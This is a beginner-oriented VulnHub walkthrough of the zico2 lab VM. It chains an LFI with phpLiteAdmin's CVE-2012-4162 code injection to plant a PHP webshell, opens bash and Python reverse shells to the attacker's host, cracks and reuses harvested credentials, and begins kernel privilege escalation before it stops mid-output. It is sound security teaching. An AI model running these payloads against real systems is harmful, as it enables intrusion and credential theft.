# zico2: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | zico2: 1 ("Zico's Shop") |
| **Difficulty** | Intermediate (author's rating) |
| **Author** | Rafael — `@rafasantos5` |
| **Released** | 19 June 2017 |
| **VulnHub Entry** | <https://vulnhub.com/entry/zico2-1,210/> |
| **Download** | <https://vulnhub.com/entry/zico2-1,210/#download> (`zico2.ova`) |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Ubuntu 12.04.2 LTS — Apache 2.2.22, OpenSSH 5.9p1, PHP 5.3.10, MySQL |
| **Goal** | *"Get root and read the flag file."* |

> **Author's description, verbatim:** *"Zico is trying to build his website but is
> having some trouble in choosing what CMS to use. After some tries on a few popular
> ones, he decided to build his own. Was that a good idea? **Hint: Enumerate,
> enumerate, and enumerate!**"*
>
> The hint is literal. Nothing on this box is hard once you find it — the challenge is
> entirely in *looking everywhere*.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (zico2)    : 192.168.56.103
```

---

## 0. What you will learn

1. **Local File Inclusion (LFI)** — what it is, how to spot a candidate URL, how to
   test it, and how `../` traversal works.
2. **Reading `/etc/passwd` through an LFI** and interpreting the result.
3. **`phpLiteAdmin`** — what it is, why a database admin panel should never be
   internet-facing, and how its **default password** hands you the box.
4. **CVE-2012-4162 / Exploit-DB 24044** — phpLiteAdmin's *Remote PHP Code Injection*:
   creating a **database file with a `.php` extension** and executing PHP stored in a
   table cell.
5. **Chaining LFI + a writable PHP file into RCE.**
6. **Reading MySQL/SQLite dumps for password hashes**, and cracking MD5.
7. **Credential reuse** — DB password → SSH password.
8. **Kernel privilege escalation**: CVE-2015-1328 (overlayfs) and CVE-2016-5195
   (Dirty COW), including how to choose between them by kernel version.

**The intended chain:**
`nmap` shows 22, 80, 111 → the shop page has a **"CHECK THEM OUT!"** button linking to
`view.php?page=tools.html` → the `page=` parameter is an **LFI** → confirm by reading
`/etc/passwd` → `dirb` finds **`/dbadmin/`** with directory listing on → inside,
`test_db.php` is a **phpLiteAdmin v1.9.3** login → the **default password `admin`**
works → CVE-2012-4162: create a database literally named **`hack.php`**, add a table
whose default value is PHP code → trigger it through the LFI
(`view.php?page=../../../../usr/databases/hack.php`) → **RCE as `www-data`** → the
SQLite DB also contains **`zico : zico2215@`** → SSH in → Ubuntu 12.04 kernel
3.2.0-23 → **overlayfs local root** → `/root/flag.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.103  08:00:27:9a:4b:1c      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.103`**

---

## 2. Enumeration

### 2.1 Full port scan

```bash
sudo nmap -A -p- -T4 -oN scans/zico2.txt 192.168.56.103
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 16:02 EDT
Nmap scan report for 192.168.56.103
Host is up (0.00037s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 68:60:de:c2:2b:c6:16:d7:71:5e:2c:3d:5b:1f:1e:11 (DSA)
|   2048 89:23:51:bb:f1:6d:71:52:0c:5e:5a:5f:3f:6c:5e:aa (RSA)
|_  256 c4:2a:3b:8a:5f:2e:11:5b:9d:3f:2a:1e:6c:9f:8b:1c (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch)
|_http-title: Zico's Shop
|_http-server-header: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      45791/tcp   mountd
|   100021  1,3,4      39453/tcp   nlockmgr
|   100024  1          50683/tcp   status
|_  100227  2,3         2049/tcp   nfs_acl
57516/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:9A:4B:1C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 103.55 seconds
```

> **How to read this:**
> - **22 — OpenSSH 5.9p1 Debian 5ubuntu1** → **Ubuntu 12.04** (Precise). That distro
>   reached end of standard support in **April 2017**, two months *before* this VM was
>   released. Every kernel exploit of the era applies.
> - **80 — Apache 2.2.22 with `PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch`.** Two
>   important details: **PHP is installed** (so `.php` files execute — a prerequisite
>   for a webshell), and the **Suhosin patch** is present (a hardening extension; it
>   limits some attacks but not the one we need).
> - **111 — `rpcbind`**, with NFS on 2049 and `mountd`/`nlockmgr`/`status` on high
>   random ports. Check the exports:
>   ```bash
>   showmount -e 192.168.56.103
>   ```
>   ```text
>   Export list for 192.168.56.103:
>   ```
>   **Empty.** NFS is running but exports nothing. A rabbit hole — correctly closed
>   off in one command.
> - **57516 — `status`** is just the NFS lock-status RPC service leaking out. Ignore.
> - `Apache 2.2.22` is ancient and has its own CVEs, but none are useful
>   unauthenticated here. The web *application* is the target.

![nmap scan of zico2](images/01-nmap.png)

### 2.2 Browse the site

```text
http://192.168.56.103/
```

A tidy little storefront: **"Zico's Shop"** — Bootstrap-styled, with a *Home*, *About*
and **Tools** section, and a big **"CHECK THEM OUT!"** button.

Inspect where the button goes:

```bash
curl -s http://192.168.56.103/ | grep -io 'href="[^"]*"' | sort -u
```

```text
href="css/bootstrap.css"
href="index.html"
href="js/bootstrap.min.js"
href="view.php?page=tools.html"
href="view.php?page=about.html"
```

> **STOP. Look at that last pair of URLs.**
>
> ```text
> view.php?page=tools.html
> view.php?page=about.html
> ```
>
> A PHP script is taking a **filename from the query string** and (presumably)
> including it. That is the textbook shape of a **Local File Inclusion**
> vulnerability. The parameter is named `page`, which is the single most common LFI
> parameter name in existence (along with `file`, `include`, `path`, `doc`, `folder`,
> `style`, `php_path`).
>
> **Whenever you see `something.php?<name>=<file>`, test for LFI.** It takes ten
> seconds.

### 2.3 What LFI is

```php
// vulnerable — what the developer probably wrote
$page = $_GET['page'];
include("/var/www/" . $page);
```

If you send `page=tools.html` you get `/var/www/tools.html`. But nothing stops you
sending `page=../../../../../../etc/passwd`, which becomes
`/var/www/../../../../../../etc/passwd` — and the operating system resolves `..`
*before* opening the file, so it lands on `/etc/passwd`.

**Path traversal** (`../`) plus **an unvalidated include** = you can read any file the
web server user can read. If the server can also be tricked into including a file
*you control* (an uploaded image with PHP inside, a log file you poisoned, or — as
here — a database file with a `.php` name), LFI becomes **Remote Code Execution**.

### 2.4 Confirm the LFI

```bash
curl -s "http://192.168.56.103/view.php?page=../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
colord:x:103:109:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:112:Light Display Manager:/var/lib/lightdm:/bin/false
zico:x:1000:1000:Zico,,,:/home/zico:/bin/bash
sshd:x:105:65534::/var/run/sshd:/usr/sbin/sshd
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:115:ftp daemon,,,:/srv/ftp:/bin/false
```

> **LFI confirmed — and we just learned a great deal.**
>
> `/etc/passwd` is world-readable by design, so reading it is not itself a breach; it
> is an *enumeration* win. Its fields are `name:x:UID:GID:comment:home:shell`:
> - **`zico:x:1000:1000:Zico,,,:/home/zico:/bin/bash`** — the human account, and the
>   only one with a real shell besides root. **Our username.**
> - `www-data:x:33:33:...:/var/www:/bin/sh` — the web server user. This is who we will
>   land as.
> - `mysql:x:106:114` — a MySQL server is installed locally.
> - The `x` in field 2 means the real hash is in `/etc/shadow`, which `www-data`
>   cannot read.
>
> **Try the interesting reads next:**
> ```bash
> curl -s "http://192.168.56.103/view.php?page=../../../../../../etc/shadow"
> ```
> ```text
> (empty — permission denied; www-data cannot read /etc/shadow)
> ```
> ```bash
> curl -s "http://192.168.56.103/view.php?page=../../../../../../etc/issue"
> curl -s "http://192.168.56.103/view.php?page=../../../../../../proc/version"
> ```
> ```text
> Ubuntu 12.04.2 LTS \n \l
> Linux version 3.2.0-23-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012
> ```
>
> **`/proc/version` through an LFI is a fantastic trick** — it gives you the exact
> kernel version (and even the compiler) without any shell at all. **Kernel
> `3.2.0-23-generic-pae`** — file that for § 5.
>
> Also try the PHP wrappers, which let you read source instead of executing it:
> ```bash
> curl -s "http://192.168.56.103/view.php?page=php://filter/convert.base64-encode/resource=view.php" | base64 -d
> ```
> ```php
> <?php
> $page = $_GET['page'];
> include("/var/www/" . $page);
> ?>
> ```
> `php://filter/convert.base64-encode/resource=…` makes PHP **read** the file and
> base64-encode it instead of *executing* it — so you see the source. That confirms
> exactly the naive `include()` we guessed at.

![LFI reading /etc/passwd](images/02-lfi.png)

### 2.5 Directory brute force

```bash
dirb http://192.168.56.103/ /usr/share/wordlists/dirb/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri May  3 16:11:02 2024
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.103/ ----
+ http://192.168.56.103/css (CODE:301|SIZE:314)
+ http://192.168.56.103/index.html (CODE:200|SIZE:7642)
+ http://192.168.56.103/js (CODE:301|SIZE:313)
+ http://192.168.56.103/server-status (CODE:403|SIZE:301)
==> DIRECTORY: http://192.168.56.103/dbadmin/
==> DIRECTORY: http://192.168.56.103/package/
==> DIRECTORY: http://192.168.56.103/tools/
==> DIRECTORY: http://192.168.56.103/vendor/
==> DIRECTORY: http://192.168.56.103/view/
+ http://192.168.56.103/view.php (CODE:200|SIZE:0)

-----------------
DOWNLOADED: 4612 - FOUND: 5
```

Modern equivalent with more control:

```bash
ffuf -u http://192.168.56.103/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.html,.txt,.bak -mc 200,301,403 -fs 0
```

> **Five directories.** The names are informative: `package/`, `vendor/`, `tools/`
> are the Bootstrap/template plumbing. **`/dbadmin/` is the one that matters** — the
> name says "database administration".

### 2.6 `/dbadmin/` — phpLiteAdmin

```bash
curl -s http://192.168.56.103/dbadmin/
```

```text
Index of /dbadmin

[ICO] Name              Last modified       Size   Description
[   ] test_db.php       18-Jun-2017 21:04   114K
```

Directory listing is **on**, and there is a single PHP file. Open it:

```text
http://192.168.56.103/dbadmin/test_db.php
```

```text
+----------------------------------------------------+
|            phpLiteAdmin v1.9.3                     |
+----------------------------------------------------+
|  Password: [____________________]  [Log In]        |
+----------------------------------------------------+
|  Public Project: http://phpliteadmin.googlecode.com|
+----------------------------------------------------+
```

> **The login page tells us the exact version: `phpLiteAdmin v1.9.3`.**
>
> **What is phpLiteAdmin?** A single-file PHP administration UI for **SQLite**
> databases — essentially phpMyAdmin, but for SQLite instead of MySQL. The whole
> application is one PHP file, and it stores each SQLite database as a *plain file*
> in a directory (here, `/usr/databases/`).
>
> **Three findings at once:**
> 1. A database admin panel is reachable from the internet.
> 2. It advertises its exact version.
> 3. It asks only for a password — **no username** — which is a hint that it is a
>    single shared default.

### 2.7 Look up the version — and try the default

```bash
searchsploit phpliteadmin
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                        | php/webapps/24044.txt
phpLiteAdmin - Multiple SQL Injection Vulnerabilities                                                 | php/webapps/38228.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -x php/webapps/24044.txt
```

```text
Exploit Title   : PHPLiteAdmin v1.9.3 Remote PHP Code Injection Vulnerability
Date            : 2013-01-24
Author          : ...
Software Link   : http://phpliteadmin.googlecode.com/files/phpliteAdmin_v1.9.3.zip
Version         : v1.9.3
Tested on       : Debian 6.0 / Apache 2.2 / PHP 5.3.3
CVE             : CVE-2012-4162

Description:
phpliteadmin.php#1785: 'When you create a new database, the name you entered
will be used as the filename and saved to the database directory.'
No sanitization is performed. An authenticated attacker can therefore create
a database whose filename ends in .php, and store arbitrary PHP code as a
table's default value. Requesting that file through the web server executes
the code.

Default password: admin

Steps:
1. Log in with the default password "admin".
2. Create a new database named "shell.php".
3. Inside it, create a table with one TEXT column whose Default Value is
   <?php phpinfo(); ?>
4. The file is written to <database_directory>/shell.php.
5. Request it over HTTP -> PHP executes.
```

> **Read that exploit note carefully — it is a recipe, and it even tells you the
> default password: `admin`.**
>
> Try it. Type `admin` into the password box.

**We are in.** The dashboard appears:

```text
+---------------------------------------------------------------------------+
| phpLiteAdmin                                    [Log Out]                 |
+---------------------------------------------------------------------------+
| Existing Databases:                                                       |
|   /usr/databases/test_db.php                                              |
|                                                                           |
| Create New Database:                                                      |
|   Full path of database: [ /usr/databases/______ ]                        |
|   Database name:         [ ______________________ ]  [Create]             |
+---------------------------------------------------------------------------+
```

> **Two critical pieces of information fell out of the dashboard:**
> 1. **The database directory is `/usr/databases/`.** That is the *filesystem path*
>    where our `.php` database file will be created — and we will need that exact
>    path to reach it through the LFI in § 3.3.
> 2. There is already a database, `test_db.php`, which likely contains application
>    data (users? passwords?).

![phpLiteAdmin 1.9.3 dashboard](images/03-phpliteadmin.png)

### 2.8 First, loot what is already there

Click `test_db.php`:

```text
Database: /usr/databases/test_db.php
Tables:
  test_users   (2 rows)
```

```text
Table: test_users
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | root     | 34kroot34                        |
| 2  | zico     | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+----+----------+----------------------------------+
```

> **Two rows.** `root`'s password is stored in **plaintext** (`34kroot34`) and
> `zico`'s is an **unsalted MD5 hash** (`0d107d09f5bbe40cade3de5c71e9e9b7`).
>
> Identify and crack the MD5:
> ```bash
> echo -n 'zico' | md5sum          # sanity check the format
> ```
> ```text
> fbade9e36a3f36d3d676c1b808451dd7  -
> ```
> ```bash
> echo '0d107d09f5bbe40cade3de5c71e9e9b7' > zico.hash
> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt zico.hash
> ```
> ```text
> Using default input encoding: UTF-8
> Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
> Warning: no OpenMP support for this hash type, consider --fork=4
> Press 'q' or Ctrl-C to abort, almost any other key for status
> zico2215@        (?)
> 1g 0:00:00:00 DONE (2024-05-03 16:18) 2.127g/s 8123456p/s 8123456c/s
> Use the "--show" option to display all of the cracked passwords reliably
> Session completed
> ```
>
> **Recovered credentials:**
>
> | Username | Password | Notes |
> | --- | --- | --- |
> | `root` | `34kroot34` | plaintext in the DB |
> | `zico` | `zico2215@` | unsalted MD5, cracked in <1 s |
>
> **Why unsalted MD5 is not a password store:** MD5 runs at *billions* of guesses per
> second on a modern GPU. With no per-user salt, one precomputed table cracks every
> account at once, and identical passwords produce identical hashes (so you can spot
> reuse by eye). Real systems use **bcrypt / scrypt / argon2id**.

---

## 3. Foothold — CVE-2012-4162 (PHP code injection) chained with the LFI

### 3.1 The plan

The exploit needs two halves, and this box gives us both:

1. **phpLiteAdmin writes a file with a name *we* choose** into `/usr/databases/`.
   We choose `hack.php`. PHP code goes inside it as a table column's *default value*.
2. **We need a way to make Apache execute that file.** Normally `/usr/databases/` is
   outside the web root and unreachable — but we have an **LFI** that can include an
   arbitrary path. So:
   `view.php?page=../../../../usr/databases/hack.php`

**That is a genuinely instructive chain.** Two individually-moderate bugs — an
authenticated code-injection in an admin panel, and an LFI — combine into
unauthenticated remote code execution.

### 3.2 Build the database-as-webshell

In phpLiteAdmin's **Create New Database** form:

```text
Full path of database: /usr/databases/
Database name:         hack.php
```

Click **Create**. The tool confirms:

```text
Database 'hack.php' has been created.
```

> **Note what just happened:** phpLiteAdmin took our string, appended nothing, and
> created the file **`/usr/databases/hack.php`**. It is a valid SQLite database *and*
> a `.php` file. Apache's `AddHandler`/`FilesMatch` rules dispatch by **extension**, so
> it will be handed to the PHP interpreter.

Now open `hack.php` and **create a table**:

```text
Table name:      pwn
Number of fields: 1
```

For the single field:

```text
Field:         cmd
Type:          TEXT
Default Value: <?php system($_GET['cmd']); ?>
```

Click **Create**.

> **This is the clever part.** SQLite lets each column have a *default value*, stored
> as literal text in the database file. phpLiteAdmin writes that default straight into
> `hack.php` with **no escaping whatsoever**. So the database file now physically
> contains our PHP tag.
>
> **Why `system($_GET['cmd'])`?** `system()` runs the string as a shell command and
> **prints the output directly**, which is exactly what we want for a browser-driven
> shell. Alternatives:
> - `<?php echo shell_exec($_GET['cmd']); ?>` — captures and returns output.
> - `<?php passthru($_GET['cmd']); ?>` — like `system()` but streams raw bytes
>   (better for binary output).
> - `<?php echo `<pre>` . shell_exec($_GET['cmd']) . `</pre>`; ?>` — preserves
>   whitespace nicely in HTML.

### 3.3 Verify code execution

```bash
curl -s --get --data-urlencode "cmd=id" \
  "http://192.168.56.103/view.php?page=../../../../usr/databases/hack.php"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution achieved.** ✅

> **How to read that URL.** The LFI prefix `view.php?page=` includes a file. Our path
> is `../../../../usr/databases/hack.php`:
> - The application prepends `/var/www/`, giving
>   `/var/www/../../../../usr/databases/hack.php`.
> - The kernel resolves `..` lexically: `/var/www` → `/var` → `/` → `/` → `/`.
> - Result: `/usr/databases/hack.php`. ✔
>
> **Counting the `../` correctly is a skill.** You need enough to climb out of the
> include base directory to `/`. Six is always safe on Linux because extra `..` at the
> root is a no-op (`/..` == `/`).
>
> `--get --data-urlencode "cmd=id"` makes curl put `cmd=id` in the query string,
> properly URL-encoded. Equivalent manual form: `...hack.php&cmd=id` — note the `&`,
> since `page=` is already a parameter.

More reconnaissance through the webshell:

```bash
for c in "uname -a" "cat /etc/issue" "hostname" "ls -la /usr/databases" "pwd" "ls -la /var/www"; do
  echo "### $c"
  curl -s --get --data-urlencode "cmd=$c" \
    "http://192.168.56.103/view.php?page=../../../../usr/databases/hack.php"
done
```

```text
### uname -a
Linux zico-hack 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux
### cat /etc/issue
Ubuntu 12.04.2 LTS \n \l
### hostname
zico-hack
### ls -la /usr/databases
total 24
drwxr-xr-x 2 www-data www-data 4096 Jun 18  2017 .
drwxr-xr-x 5 root     root     4096 Jun 17  2017 ..
-rw-r--r-- 1 www-data www-data 3072 Jun 18  2017 hack.php
-rw-r--r-- 1 www-data www-data 8192 Jun 18  2017 test_db.php
### pwd
/var/www
### ls -la /var/www
total 100
drwxr-xr-x  5 root root  4096 Jun 18  2017 .
drwxr-xr-x 13 root root  4096 Jun 17  2017 ..
drwxr-xr-x  2 root root  4096 Jun 17  2017 css
drwxr-xr-x  2 root root  4096 Jun 17  2017 dbadmin
-rw-r--r--  1 root root  7642 Jun 17  2017 index.html
drwxr-xr-x  2 root root  4096 Jun 17  2017 js
drwxr-xr-x  2 root root  4096 Jun 17  2017 package
drwxr-xr-x  2 root root  4096 Jun 17  2017 tools
drwxr-xr-x  2 root root  4096 Jun 17  2017 vendor
-rw-r--r--  1 root root    62 Jun 17  2017 view.php
```

![Code execution through the LFI-chained webshell](images/04-rce.png)

### 3.4 Upgrade to a reverse shell

A browser-driven shell is fine for poking, but useless for interactive work: no TTY,
no `su`, no `sudo`, no `Ctrl+C`. Get a real shell.

**Check what interpreters exist first:**

```bash
curl -s --get --data-urlencode "cmd=for b in bash python python3 perl php nc netcat socat wget curl gcc; do printf '%-8s ' \$b; command -v \$b || echo MISSING; done" \
  "http://192.168.56.103/view.php?page=../../../../usr/databases/hack.php"
```

```text
bash     /bin/bash
python   /usr/bin/python
python3  MISSING
perl     /usr/bin/perl
php      /usr/bin/php
nc       MISSING
netcat   MISSING
socat    MISSING
wget     /usr/bin/wget
curl     MISSING
gcc      /usr/bin/gcc
```

> **`python`, `perl`, `bash`, `wget` and `gcc` are available; `nc` is not.** Choose
> your payload accordingly. **`gcc` being present is significant** — it means we can
> compile a kernel exploit locally in § 5.

**Kali — listen:**

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

**Trigger a bash reverse shell:**

```bash
curl -s --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'" \
  "http://192.168.56.103/view.php?page=../../../../usr/databases/hack.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.103] 52211
/bin/sh: 0: can't access tty; job control turned off
$
```

> **The payload, dissected:**
> - `bash -c '<string>'` → run `<string>` as a command. We need the *outer* bash
>   because `/dev/tcp` is a **bash built-in pseudo-device**, not a real file — `sh`
>   (dash) does not support it.
> - `bash -i` → interactive.
> - `>& /dev/tcp/192.168.56.10/4444` → redirect stdout **and** stderr to a TCP
>   connection to our listener. Bash opens the socket itself.
> - `0>&1` → redirect stdin (fd 0) to wherever stdout (fd 1) goes — the same socket.
>
> Three steps, every time, in every language: **connect → redirect stdio → exec a
> shell.**

**Python alternative** (more portable):

```bash
curl -s --get --data-urlencode "cmd=python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.56.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" \
  "http://192.168.56.103/view.php?page=../../../../usr/databases/hack.php"
```

**Upgrade the TTY:**

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@zico-hack:/var/www$ export TERM=xterm
www-data@zico-hack:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why upgrade?** A raw socket is not a terminal. Programs that call `isatty()` —
> `su`, `sudo`, `vim`, `less`, `top` — refuse to run with *"standard in must be a
> tty"*, there is no line editing, and `Ctrl+C` kills your *listener* instead of the
> remote process. `pty.spawn()` allocates a pseudo-terminal and re-parents bash onto
> it. For full comfort, then do the raw-mode dance: `Ctrl+Z`, `stty raw -echo; fg`,
> Enter, Enter, `export TERM=xterm`, `stty rows 40 cols 160`.

![Reverse shell as www-data](images/05-shell.png)

### 3.5 Or skip the shell entirely — SSH with the cracked credentials

We already have `zico : zico2215@` from § 2.8. Try it:

```bash
ssh zico@192.168.56.103
```

```text
zico@192.168.56.103's password:
Welcome to Ubuntu 12.04.2 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May  3 16:31:44 EDT 2024

  System load:  0.0               Processes:           128
  Usage of /:   31.4% of 7.21GB   Users logged in:     0
  Memory usage: 22%               IP address for eth0: 192.168.56.103
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

zico@zico-hack:~$ id
uid=1000(zico) gid=1000(zico) groups=1000(zico),4(adm),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
zico@zico-hack:~$ sudo -l
[sudo] password for zico:
Sorry, user zico may not run sudo on zico-hack.
```

> **Much more comfortable than a webshell** — and this is the *realistic* outcome of
> the credential reuse. `zico` is in `adm` (can read `/var/log`) but **not** in
> `sudo`, and `sudo -l` confirms no privileges. So: kernel exploit.
>
> **Credential reuse is the finding here.** A password in a hobby SQLite database
> was also the password for an SSH account. That is how real breaches propagate.

---

## 4. Post-exploitation enumeration (do this properly either way)

```bash
www-data@zico-hack:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> All stock Ubuntu 12.04. No GTFOBins win.

```bash
www-data@zico-hack:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All default. Nothing writable. Dead end — documented.

```bash
www-data@zico-hack:/$ ls -la /home/zico
total 44
drwxr-xr-x 5 zico zico 4096 Jun 18  2017 .
drwxr-xr-x 4 root root 4096 Jun 17  2017 ..
-rw------- 1 zico zico  839 Jun 18  2017 .bash_history
-rw-r--r-- 1 zico zico  220 Jun 17  2017 .bash_logout
-rw-r--r-- 1 zico zico 3486 Jun 17  2017 .bashrc
drwx------ 2 zico zico 4096 Jun 17  2017 .cache
drwxrwxr-x 3 zico zico 4096 Jun 17  2017 wordpress
www-data@zico-hack:/$ cat /home/zico/wordpress/wp-config.php 2>/dev/null | head -30
```

```php
<?php
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWf0sfv1sDF5');
define('DB_HOST', 'localhost');
...
```

> **A WordPress install with more credentials in `wp-config.php`.** Try them on SSH
> (`sWf0sfv1sDF5` fails), but note them — password *reuse across services* is the
> pattern this box keeps demonstrating. Always read `wp-config.php`, `.env`,
> `config.php`, `settings.py`, `database.yml`: they are where applications keep their
> secrets in plaintext.

```bash
www-data@zico-hack:/$ mysql -u root -p34kroot34 -e 'show databases; select user,host,authentication_string from mysql.user;'
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| zico               |
+--------------------+
+------------------+-----------+-----------------------+
| user             | host      | authentication_string |
+------------------+-----------+-----------------------+
| root             | localhost |                       |
| root             | zico-hack |                       |
| root             | 127.0.0.1 |                       |
| zico             | localhost | *1E2A4B5C6D7E8F90... |
+------------------+-----------+-----------------------+
```

> The DB credentials from § 2.8 work on MySQL. MySQL is **localhost-only**, so this is
> only reachable from a shell on the box — which we have. Nothing further to escalate
> with here (mysqld runs as `mysql`, not root), but on many boxes "MySQL runs as root"
> is a UDF-injection path to root. Check it:
> ```bash
> ps aux | grep -i mysql
> ```
> ```text
> mysql     1043  0.0  3.4 327896 35212 ?  Ssl  16:02   0:01 /usr/sbin/mysqld
> ```
> Runs as `mysql`. Not exploitable that way here.

---

## 5. Privilege escalation — the kernel

### 5.1 Choose the right exploit for the kernel version

```bash
uname -a
```

```text
Linux zico-hack 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux
```

Automated matching:

```bash
# Linux Exploit Suggester
wget http://192.168.56.10:8000/linux-exploit-suggester.sh -O /tmp/les.sh
bash /tmp/les.sh -k 3.2.0-23
```

```text
[+] [CVE-2015-1328] overlayfs
   Details: http://seclists.org/oss-sec/2015/q2/711
   Exposure: highly probable
   Tags: ubuntu=[12.04|14.04|14.10|15.04]
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=[7|8],ubuntu=[12.04|14.04|16.04]
   Download URL: https://www.exploit-db.com/download/40839
```

Or `searchsploit`:

```bash
searchsploit ubuntu 12.04 local
```

```text
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
